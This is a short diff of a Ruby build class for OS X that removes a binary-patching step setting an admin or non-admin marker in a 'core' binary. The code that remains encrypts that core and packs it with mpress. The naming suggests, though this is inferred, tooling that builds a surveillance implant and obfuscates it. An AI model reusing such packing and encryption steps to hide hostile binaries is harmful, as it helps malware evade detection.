@@ -35,16 +35,6 @@ class BuildOSX < Build
     # invoke the generic patch method with the new params
     super
 
-    patch_file(:file => params[:core]) do |content|
-      begin
-        method = params['admin'] ? 'Ah57K' : 'Ah56K'
-        method += SecureRandom.random_bytes(27)
-        content.binary_patch 'iuherEoR93457dFADfasDjfNkA7Txmkl', method
-      rescue
-        raise "Working method marker not found"
-      end
-    end
-
     FileUtils.mv path(params[:core]), path('core_clear')
     CrossPlatform.exec path('seg_encrypt'), path('core_clear') + ' ' + path(params[:core])
     CrossPlatform.exec path('mpress'), "-ub " + path(params[:core])
